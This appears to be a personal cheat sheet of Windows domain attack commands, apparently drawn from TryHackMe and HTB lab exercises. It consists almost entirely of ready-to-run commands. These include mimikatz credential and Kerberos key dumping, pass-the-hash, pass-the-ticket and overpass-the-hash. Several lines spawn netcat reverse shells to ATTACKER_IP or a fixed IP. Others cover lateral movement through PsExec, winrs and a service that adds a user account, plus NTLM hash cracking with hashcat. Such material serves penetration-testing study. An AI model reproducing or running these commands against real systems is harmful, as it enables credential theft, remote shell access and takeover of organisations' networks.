1) pass the hash method   (by local admin, if you are already domain admin you can use winrs or psexe)

a)
mimikatz # privilege::debug

 Privilege '20' OK


b) 
mimikatz # token::elevate            <- check our sytutaion  (info  that you are 'NT AUTHORITY\SYSTEM' )
 Token Id  : 0
User name : 
SID name  : NT AUTHORITY\SYSTEM

228     {0;000003e7} 0 D 29313          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,30p)       Primary
 -> Impersonated !
 * Process Token : {0;000003e7} 0 D 958111      NT AUTHORITY\SYSTEM     S-1-5-18        (04g,27p)       Primary
 * Thread Token  : {0;000003e7} 0 D 1134941     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,30p)       Impersonation (Delegation)


c) dump hashes: 
	mimikatz #  sekurlsa::logonpasswords                             <- dump hashes can also dump sam    sekurlsa::msv

...
...
NTLM


also :
		mimikatz # lsadump::sam		<-- hashes from local users on the machines (no domain users)

		mimikatz # sekurlsa::msv	<-- extrack any NTLM hashes local and domain users that has recently logged onto machine	



d) pass the hash method execution (set listener on attack box:   user@AttackBox$ nc-lnvp 5556) : 

mimikatz # token::revert        <-- reestablish our original token priv. pass the hash with an elevated token wont work


mimikatz # sekurlsa::pth /user:domaindaminIam /domain:htb.local /ntlm:1d34..de67                <- pass the hash

mimikatz # sekurlsa::pth /user:Administrator /domain:lab.local /ntlm:13b29.....75 /run:cmd          <- it will open new prompt 

mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /ntlm:13b29.....75 /run:"c:tools\nc64.exe -e cmd.exe ATACKER_IP 5555"

(who am i will not work)

	also in linux can use tools like:
		evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH 
		psexec.py -hashes NTLM_HACH DOMAIN/MyUser@Visctim_IP
		xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH

e) leteral movement:
	
	if you have on net cat
		C:\Windows> winrs.exe -r:THMIIS.za.tryhackme.com cmd

-------------------------------------------------------------------------------------------------------------------------

2) Pass the ticket method (need a ticket and session key):

a)
set:
	mimikatz # privilege::debug


b) get ticket:
export ticket:
	mimikatz # sekurlsa::tickets /export

	
		...
		Ticket     :0x0000000012 - aes256_hmac       ;kvon = 2 [...]
		* Saved to file [0;cc185]-2-0-40e...00-t1_toby.beck@krbtgt-ZA.TRYHACKME.COM.kirbi  !
		....


c) inject ticket:
	mimikatz # kerberos::ptt [0;cc185]-2-0-40e...00-t1_toby.beck@krbtgt-ZA.TRYHACKME.COM.kirbi    

	should look like:
	mimikatz # kerberos::ptt [0;427fcd5]-1-0-4....-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi

	C:\> klist

-------------------------------------------------------------------------------------------------------------------------

3) Overpass the hash / pass the key method execution (simmilar to pass the hash but in kerberos)

a)
mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys

b)
copy hash and user:
	copy hash:  "rc4_hmac_nt 533f1bd.........60fe"
	copy user:  "t1_toby.beck"
	to file: echo "t1_toby.beck:rc4_hmac_nt 533f1bd.........60fe" > toby_rc4.txt

if we have RC4 hach: (in RC4 key is equal to NTLM hash )
	mimikatz # sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /533f1bd.........60fe /run:"c:\tools\nc64.exe -e cmd.exe 10.50.79.12 5556"	

	should look like:
	mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea....7d8 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"


if we have AES128 hash:	
	mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea....88s /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"


if we have AES128 hash:
	mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:b54....b65 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"



c) get shell

set listener on attack box:
	user@AttackBox$ nc-lnvp 5556


------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------

now you na use command prompt:
C:\PSTools>PsExec.exe \\192.168.61.155 cmd

------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------
4) lateral movement on other machines:

on windows:
	psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cme.exe
	
	winrs.exe -u:Administrator -p:Mypass123 -r:target cmd

	sc.exe \\TARGET create THMService binPath="net user munra Pass123 /add" start=auto    <-- create service named THMService
	sc.exe \\TARGET start THMService
	sc.exe \\TARGET stop THMService                                                       <-- clean after done
	sc.exe \\TARGET delete THMService     

------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------
also:
mimikatz #  lsadump::sam            <- dump contenet of sam database  also ntlm     and  SysKey!!!

mimikatz # lsadump::lsa  			<- get users  and computers
mimikatz # lsadump::lsa /patch			<- get users  and computers witch hashes

use pass the hash in mimikatz:



----------------------------------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------
can crack NTLM with hashcat
hachcat -m 1000 63f12..9b /usr/share/wordlist/rockyou.txt

----------------------------------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------

